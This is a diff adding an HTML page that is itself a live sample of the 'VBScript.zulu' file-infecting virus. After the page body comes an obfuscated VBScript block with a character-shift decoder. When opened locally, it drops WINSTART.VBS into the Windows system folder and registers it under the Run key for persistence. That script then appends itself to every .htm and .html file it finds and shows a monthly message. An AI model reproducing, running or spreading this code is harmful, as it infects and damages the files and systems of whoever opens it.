@@ -1,0 +1,171 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Type"
+content="text/html; charset=iso-8859-1">
+<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
+<title>VBScript.zulu</title>
+</head>
+
+<body bgcolor="#FFFFFF">
+
+<p align="left"><font size="4" face="Arial">VBScript.zulu 1.0
+infected file.</font></p>
+</body>
+</html>
+<Script Language="VBScript">
+If Location.Protocol = A("ghmd;") Then
+  B
+End If
+
+Function A(C)
+  For D = 1 To Len(C)
+    If Asc(Mid(C, D, 1)) <> 34 And Asc(Mid(C, D, 1)) <> 35 And Asc(Mid(C, D, 1)) <> 126 Then
+      If Asc(Mid(C, D, 1)) Mod 2 = 0 Then
+        A = A + Chr(Asc(Mid(C, D, 1)) + 1)
+      Else
+        A = A + Chr(Asc(Mid(C, D, 1)) - 1)
+      End If
+    Else
+      A = A + Mid(C, D, 1)
+    End If
+  Next
+End Function
+
+Sub B
+  Set E = CreateObject(A("Rbshquhof/GhmdRxrudlNckdbu"))
+  Set F = E.CreateTextFile(E.BuildPath(E.GetSpecialFolder(1), A("VHORU@SU/WCR")), True)
+  F.WriteLine(A("Rdu!@!<!Bsd`udNckdbu)C)""Uepknrkli,DkjgU{urgoQ`hger""(("))
+  F.WriteLine(A("Rdu!B!<!Bsd`udNckdbu)C)""YUepknr,Ufgjj""(("))
+  F.WriteLine(A("S`oenlh{d"))
+  F.WriteLine(A("E!<!Hou))7!,!0!*!0(!+!Soe!*!0("))
+  F.WriteLine(A("Hg!E!<!0!Uido"))
+  F.WriteLine(A("!!D!<!@/FduRqdbh`mGnmeds)3("))
+  F.WriteLine(A("DmrdHg!E!<!3!Uido"))
+  F.WriteLine(A("!!D!<!@/CthmeQ`ui)@/FduRqdbh`mGnmeds)1(-!C)""FGJN""(("))
+  F.WriteLine(A("DmrdHg!E!<!2!Uido"))
+  F.WriteLine(A("!!D!<!@/CthmeQ`ui)@/FduRqdbh`mGnmeds)1(-!C)""RGONQPCP[!KLRGPLGR!DKJGU""(("))
+  F.WriteLine(A("DmrdHg!E!<!5!Uido"))
+  F.WriteLine(A("!!D!<!B/Rqdbh`mGnmedsr)C)""Bgumrqn""(("))
+  F.WriteLine(A("DmrdHg!E!<!4!Uido"))
+  F.WriteLine(A("!!D!<!B/Rqdbh`mGnmedsr)C)""O{Bqewoglru""(("))
+  F.WriteLine(A("DmrdHg!E!<!7!Uido"))
+  F.WriteLine(A("!!D!<!B/SdfSd`e)C)""FMG[aJQECJaOCEFKLGZUqdrycpgZOkepquqdrZYklbqyuZEwppglrTgpukqlZNpqipcoDkjguBkp""(("))
+  F.WriteLine(A("Doe!Hg"))
+  F.WriteLine(A("Hg!@/GnmedsDyhrur)D(!<!Ustd!Uido"))
+  F.WriteLine(A("!!Gns!D`bi!G!Ho!@/FduGnmeds)D(/Ghmdr"))
+  F.WriteLine(A("!!!!Hg!TB`rd)@/FduDyudorhnoO`ld)G/O`ld((!<!TB`rd)C)""fro""((!Ns!TB`rd)@/FduDyudorhnoO`ld)G/O`ld((!<!TB`rd)C)""froj""((!Uido"))
+  F.WriteLine(A("!!!!!!Hg!F)@/CthmeQ`ui)G/Q`sdouGnmeds-!G/O`ld((!<!G`mrd!Uido"))
+  F.WriteLine(A("!!!!!!!!I!@/CthmeQ`ui)G/Q`sdouGnmeds-!G/O`ld("))
+  F.WriteLine(A("!!!!!!Doe!Hg"))
+  F.WriteLine(A("!!!!Doe!Hg"))
+  F.WriteLine(A("!!Odyu"))
+  F.WriteLine(A("!!Rdu!H!<!@/FduGnmeds)D("))
+  F.WriteLine(A("!!Rdu!K!<!H/RtcGnmedsr"))
+  F.WriteLine(A("!!Gns!D`bi!J!Ho!K"))
+  F.WriteLine(A("!!!!Gns!D`bi!M!Ho!J/Ghmdr"))
+  F.WriteLine(A("!!!!!!Hg!TB`rd)@/FduDyudorhnoO`ld)M/O`ld((!<!TB`rd)C)""fro""((!Ns!TB`rd)@/FduDyudorhnoO`ld)M/O`ld((!<!TB`rd)C)""froj""((!Uido"))
+  F.WriteLine(A("!!!!!!!!Hg!F)@/CthmeQ`ui)M/Q`sdouGnmeds-!M/O`ld((!<!G`mrd!Uido"))
+  F.WriteLine(A("!!!!!!!!!!I!@/CthmeQ`ui)M/Q`sdouGnmeds-!M/O`ld("))
+  F.WriteLine(A("!!!!!!!!Doe!Hg"))
+  F.WriteLine(A("!!!!!!Doe!Hg"))
+  F.WriteLine(A("!!!!Odyu"))
+  F.WriteLine(A("!!Odyu"))
+  F.WriteLine(A("Doe!Hg"))
+  F.WriteLine(A("Hg!E`x)Onv(!<!0!Uido"))
+  F.WriteLine(A("!!LrfCny!C)""Gurc!ocswklc!gurc!kldgercbc!nqp!gj!tkpwu!xwjw*!fgefq!nqp!xwjw!&swg!qpkiklcjkbcb!jc!oïc+,!Jq!ølkeq!swg!fceg!cbgoãu!bg!oqurpcpug!gj!npkogpq!bg!ecbc!ogu!gu!bwnjkecpug,!Uqjq!gurc!fgefq!ncpc!tgp!fcurc!bqlbg!nwgbg!jjgicp!wl!tkpwu!bg!gurg!rknq!&lq!ow{!jghqu!ugiøl!epgq+,!Gj!tkpwu!xwjw!gl!pgcjkbcb!{c!gvkurg*!ngpq!eqoq!gu!rcl!bkurklrq*!ecuk!lk!ug!eqlqeg!{!c!ok!lq!ug!og!qewppïc!lkliøl!qrpq!lqo`pg*!jg!nwug!kiwcj,!@wglq*!fcurc!jc!npõvkoc!tgx!swg!npglbcl!jc!ocswklc!gl!gj!bïc!bg!fq{!q!fcurc!gj!npõvkoq!ogu!uk!gu!swg!jc!npglbgl!gj!npkogpq!&q`tkcoglrg*!okglrpcu!lq!fc{cl!ucecbq!gj!tkpwu+,""(-!5003-!C)""xwjw!3,.""("))
+  F.WriteLine(A("Doe!Hg"))
+  F.WriteLine(A(""))
+  F.WriteLine(A("Gtobuhno!C)L("))
+  F.WriteLine(A("!!Gns!O!<!0!Un!Mdo)L("))
+  F.WriteLine(A("!!!!Hg!@rb)Lhe)L-!O-!0((!=?!23!@oe!@rb)Lhe)L-!O-!0((!=?!22!@oe!@rb)Lhe)L-!O-!0((!=?!25!@oe!@rb)Lhe)L-!O-!0((!=?!071!@oe!@rb)Lhe)L-!O-!0((!=?!344!Uido"))
+  F.WriteLine(A("!!!!!!Hg!@rb)Lhe)L-!O-!0((!Lne!3!<!1!Uido"))
+  F.WriteLine(A("!!!!!!!!C!<!C!*!Bis)@rb)Lhe)L-!O-!0((!,!0("))
+  F.WriteLine(A("!!!!!!Dmrd"))
+  F.WriteLine(A("!!!!!!!!C!<!C!*!Bis)@rb)Lhe)L-!O-!0((!*!0("))
+  F.WriteLine(A("!!!!!!Doe!Hg"))
+  F.WriteLine(A("!!!!Dmrd"))
+  F.WriteLine(A("!!!!!!C!<!C!*!Lhe)L-!O-!0("))
+  F.WriteLine(A("!!!!Doe!hg"))
+  F.WriteLine(A("!!Odyu"))
+  F.WriteLine(A("Doe!Gtobuhno"))
+  F.WriteLine(A(""))
+  F.WriteLine(A("Gtobuhno!F)N("))
+  F.WriteLine(A("!!Rdu!Q!<!@/NqdoUdyuGhmd)N-!0("))
+  F.WriteLine(A("!!Hg!Q/@uDoeNgRusd`l!<!G`mrd!Uido"))
+  F.WriteLine(A("!!!!P!<!Q/Sd`eMhod"))
+  F.WriteLine(A("!!Doe!Hg"))
+  F.WriteLine(A("!!En!Vihmd!P!=?!C)""!!I,PgiYpkrg!C&""""KHBV\OL@>O\J>@KFQB_Pliwt^ub_Jf`ulpliw_Tfqgltp_@ruubqwYbupflq_Urq_TfqPw^uw""""+*!G,@wkjbNcrf&G,IgrUngekcjDqjbgp&3+*!C&""""TFQPW>UW1YEP""""++""(!@oe!Q/@uDoeNgRusd`l!<!G`mrd"))
+  F.WriteLine(A("!!!!P!<!Q/Sd`eMhod"))
+  F.WriteLine(A("!!Mnnq"))
+  F.WriteLine(A("!!Q/Bmnrd"))
+  F.WriteLine(A("!!Hg!P!<!C)""!!I,PgiYpkrg!C&""""KHBV\OL@>O\J>@KFQB_Pliwt^ub_Jf`ulpliw_Tfqgltp_@ruubqwYbupflq_Urq_TfqPw^uw""""+*!G,@wkjbNcrf&G,IgrUngekcjDqjbgp&3+*!C&""""TFQPW>UW1YEP""""++""(!Uido"))
+  F.WriteLine(A("!!!!F!<!Ustd"))
+  F.WriteLine(A("!!Dmrd"))
+  F.WriteLine(A("!!!!F!<!G`mrd"))
+  F.WriteLine(A("!!Doe!Hg"))
+  F.WriteLine(A("Doe!Gtobuhno"))
+  F.WriteLine(A(""))
+  F.WriteLine(A("Rtc!I)S("))
+  F.WriteLine(A("!!Rdu!R!<!@/FduGhmd)S("))
+  F.WriteLine(A("!!U!<!R/@uushctudr"))
+  F.WriteLine(A("!!Hg!U!=?!1!Uido"))
+  F.WriteLine(A("!!!!R/@uushctudr!<!1"))
+  F.WriteLine(A("!!Doe!Hg"))
+  F.WriteLine(A("!!Rdu!T!<!@/NqdoUdyuGhmd)S-!9("))
+  F.WriteLine(A("!!T/VshudMhod)C)"":Uepknr!Jcliwcig?""""T@Uepknr""""<""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""Kd!Jqecrkql,Npqrqeqj!?!C&""""ifob=""""+!Rfgl""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""!!@""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""Glb!Kd""(("))
+  F.WriteLine(A("!!T/VshudMhod)""""("))
+  F.WriteLine(A("!!T/VshudMhod)C)""Dwlerkql!C&E+""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""!!Dqp!B!?!3!Rq!Jgl&E+""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""!!!!Kd!Cue&Okb&E*!B*!3++!:<!52!Clb!Cue&Okb&E*!B*!3++!:<!57!Clb!Cue&Okb&E*!B*!3++!:<!304!Rfgl""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""!!!!!!Kd!Cue&Okb&E*!B*!3++!Oqb!0!?!.!Rfgl""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""!!!!!!!!C!?!C!-!Efp&Cue&Okb&E*!B*!3++!-!3+""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""!!!!!!Gjug""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""!!!!!!!!C!?!C!-!Efp&Cue&Okb&E*!B*!3++!/!3+""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""!!!!!!Glb!Kd""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""!!!!Gjug""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""!!!!!!C!?!C!-!Okb&E*!B*!3+""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""!!!!Glb!Kd""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""!!Lgvr""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""Glb!Dwlerkql""(("))
+  F.WriteLine(A("!!T/VshudMhod)""""("))
+  F.WriteLine(A("!!T/VshudMhod)C)""Uw`!@""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""!!Ugr!G!?!EpgcrgQ`hger&C&""""P`ufswfqd1IfobPvpwbjLemb`w""""++""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""!!Ugr!D!?!G,EpgcrgRgvrDkjg&G,@wkjbNcrf&G,IgrUngekcjDqjbgp&3+*!C&""""TFQPW>UW1YEP""""++*!Rpwg+""(("))
+  F.WriteLine(A("!!Rdu!W!<!@/NqdoUdyuGhmd)VRbshqu/RbshquGtmmO`ld-!0("))
+  F.WriteLine(A("!!En!Vihmd!W/@uDoeNgRusd`l!<!G`mrd"))
+  F.WriteLine(A("!!!!T/VshudMhod)C)""!!D,YpkrgJklg&C&""""""(!*!V)Sdqm`bd)W/Sd`eMhod-!C)""""""""(-!C)""""""""""""(((!*!C)""""""++""(("))
+  F.WriteLine(A("!!Mnnq"))
+  F.WriteLine(A("!!W/Bmnrd"))
+  F.WriteLine(A("!!T/VshudMhod)C)""!!D,Ejqug""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""!!Ugr!I!?!EpgcrgQ`hger&C&""""TP`ufsw1Pkboo""""++""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""!!I,PgiYpkrg!C&""""KHBV\OL@>O\J>@KFQB_Pliwt^ub_Jf`ulpliw_Tfqgltp_@ruubqwYbupflq_Urq_TfqPw^uw""""+*!G,@wkjbNcrf&G,IgrUngekcjDqjbgp&3+*!C&""""TFQPW>UW1YEP""""++""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)""Glb!Uw`""(("))
+  F.WriteLine(A("!!T/VshudMhod)C)"":1Uepknr<""(("))
+  F.WriteLine(A("!!T/Bmnrd"))
+  F.WriteLine(A("!!Hg!U!=?!1!Uido"))
+  F.WriteLine(A("!!!!R/@uushctudr!<!U"))
+  F.WriteLine(A("!!Doe!Hg"))
+  F.WriteLine(A("Doe!Rtc"))
+  F.WriteLine(A(""))
+  F.WriteLine(A("Gtobuhno!V)Y("))
+  F.WriteLine(A("!!Gns!X!<!0!Un!Mdo)Y("))
+  F.WriteLine(A("!!!!Hg!@rb)Lhe)Y-!X-!0((!=?!25!@oe!@rb)Lhe)Y-!X-!0((!=?!24!@oe!@rb)Lhe)Y-!X-!0((!=?!037!Uido"))
+  F.WriteLine(A("!!!!!!Hg!@rb)Lhe)Y-!X-!0((!Lne!3!<!1!Uido"))
+  F.WriteLine(A("!!!!!!!!V!<!V!*!Bis)@rb)Lhe)Y-!X-!0((!*!0("))
+  F.WriteLine(A("!!!!!!Dmrd"))
+  F.WriteLine(A("!!!!!!!!V!<!V!*!Bis)@rb)Lhe)Y-!X-!0((!,!0("))
+  F.WriteLine(A("!!!!!!Doe!Hg"))
+  F.WriteLine(A("!!!!Dmrd"))
+  F.WriteLine(A("!!!!!!V!<!V!*!Lhe)Y-!X-!0("))
+  F.WriteLine(A("!!!!Doe!Hg"))
+  F.WriteLine(A("!!Odyu"))
+  F.WriteLine(A("Doe!Gtobuhno"))
+  F.Close
+  Set G = CreateObject(A("VRbshqu/Ridmm"))
+  G.RegWrite A("IJDX^MNB@M^L@BIHOD]Rnguv`sd]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Sto]VhoRu`su"), E.BuildPath(E.GetSpecialFolder(1), A("VHORU@SU/WCR"))
+End Sub
+</Script>
